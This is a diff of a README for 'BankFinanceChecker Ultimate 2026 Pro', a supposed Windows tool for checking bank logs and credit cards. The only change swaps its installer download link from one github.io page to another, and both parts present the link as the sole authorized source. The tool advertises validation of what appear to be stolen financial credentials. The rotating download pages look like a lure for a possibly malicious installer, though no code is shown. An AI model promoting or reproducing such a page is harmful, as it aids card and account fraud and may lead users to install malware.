@@ -2,7 +2,7 @@
 
 BankFinanceChecker Ultimate 2026 Pro is a comprehensive Windows desktop application designed for verifying bank logs, credit cards, and various financial accounts. This tool provides a user-friendly interface to streamline your finance checking processes in 2026, ensuring accuracy and efficiency for both personal and professional use.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -56,6 +56,6 @@ A4: The tool supports a wide range of international bank logs and credit cards, 
 
 To get started with BankFinanceChecker Ultimate 2026 Pro, download the latest version from the official GitHub page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This is the only authorized source for downloading the tool. Ensure you always use the latest version for security, bug fixes, and new features. Last updated: 2026.
